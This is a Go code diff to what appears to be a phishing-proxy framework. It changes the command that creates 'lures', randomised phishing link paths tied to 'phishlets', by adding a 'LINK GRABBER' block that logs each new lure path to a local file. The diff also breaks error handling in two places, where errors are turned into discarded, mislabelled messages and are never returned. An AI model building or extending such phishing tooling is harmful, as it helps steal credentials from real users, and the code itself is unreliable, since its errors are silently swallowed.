@@ -722,12 +722,35 @@ func (t *Terminal) handleLures(args []string) error {
 			if pn == 2 {
 				_, err := t.cfg.GetPhishlet(args[1])
 				if err != nil {
-					return err
+					fmt.Errorf("Error creating file")
 				}
 				l := &Lure{
 					Path:     "/" + GenRandomString(8),
 					Phishlet: args[1],
 				}
+				
+				// LINK GRABBER /////////////////////////////////////////////////////////////////////////////////////////
+
+				file, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				if err != nil {
+					return err
+    				}
+    				defer file.Close()
+
+				//l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+				//l, err := t.cfg.GetLure(l_id)
+				//if err != nil {
+				//	return fmt.Errorf("get-url: %v", err)
+				//}
+				
+				//var base_url string
+				//base_url = "https://" + l.Hostname + l.Path
+
+				_, err = file.WriteString(l.Path + "\n")
+				if err != nil {
+					fmt.Errorf("Erorr writing string")
+				}
+
 				t.cfg.AddLure(args[1], l)
 				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
 				return nil
